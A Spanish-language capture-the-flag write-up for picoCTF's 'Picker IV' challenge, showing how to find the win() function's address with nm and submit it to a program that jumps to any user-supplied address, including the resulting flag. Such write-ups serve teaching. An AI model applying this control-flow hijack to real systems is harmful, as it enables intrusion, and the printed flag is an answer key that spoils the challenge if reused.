# Reto
Picker IV
## Descripción 
Can you figure out how this program works to get the flag?
Connect to the program with netcat:
$ nc saturn.picoctf.net 62135
The program's source code can be downloaded here. The binary can be downloaded here.


## Solución



Descargamos el codigo fuente en C y el binario del reto,
Analizando el código fuente advertimos que nos pide una dirección de memoria y luego se salta a esa dirección y ejecuta el código.
Obtenemos la dirección de las funciones, ahi aparece la dirección de win()
```
nm ./picker-IV | grep " T "
0000000000401440 T __libc_csu_fini
00000000004013d0 T __libc_csu_init
00000000004011c0 T _dl_relocate_static_pie
0000000000401448 T _fini
0000000000401000 T _init
0000000000401190 T _start
0000000000401334 T main
0000000000401276 T print_segf_message
000000000040129e T win
```

Ejecutamos el binario y ponemos la dirección de la función que encontramos:
```
./picker-IV
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
Cannot open file.
```

Ahora lo corremos en 
```
 nc saturn.picoctf.net 63471
Enter the address in hex to jump to, excluding '0x': 40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```